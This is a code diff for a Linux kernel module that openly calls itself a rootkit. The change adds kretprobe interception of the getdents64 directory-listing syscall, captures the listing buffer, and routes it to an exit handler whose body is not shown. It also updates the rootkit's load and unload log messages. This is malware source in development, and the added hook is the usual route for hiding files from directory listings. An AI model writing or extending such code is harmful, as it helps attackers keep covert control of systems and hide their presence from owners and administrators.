@@ -29,6 +29,12 @@ static int syscall_entry(struct kretprobe_instance *k, struct pt_regs *regs) {
     char *__user filename = (char *)syscall_regs->di;
     open_enter_handler(filename, data);
     data->syscall = OPEN;
+  } else if (syscall_number == 0xd9) {
+    data->syscall = GET_DENTS;
+    data->metadata.get_dents_metadata.buf_size =
+        *(unsigned int *)&syscall_regs->dx;
+    data->metadata.get_dents_metadata.entries =
+        (struct linux_dirent64 *)syscall_regs->si;
   }
 
   return 0;
@@ -39,6 +45,9 @@ static int syscall_exit(struct kretprobe_instance *k, struct pt_regs *regs) {
 
   if (data->syscall == OPEN) {
     open_exit_handler(regs, *data);
+  }
+  if (data->syscall == GET_DENTS) {
+    getdents64_exit_handler(regs, *data);
   }
 
   free_syscall_metadata(*data);
@@ -55,7 +64,7 @@ static int __init rootkit_enter(void) {
   kp.handler = &syscall_exit;
 
   if (register_kretprobe(&kp) != 0) {
-    printk(KERN_INFO "Failed kprobing on mkdir");
+    printk(KERN_INFO "Failed kprobing on syscall");
   }
 
   return 0;
@@ -64,7 +73,7 @@ static int __init rootkit_enter(void) {
 static void __exit rootkit_exit(void) {
   unregister_kretprobe(&kp);
 
-  printk(KERN_INFO "Goodbye, world! The module is being unloaded.\n");
+  printk(KERN_INFO "Goodbye rootkit unloaded\n");
 }
 
 module_init(rootkit_enter);
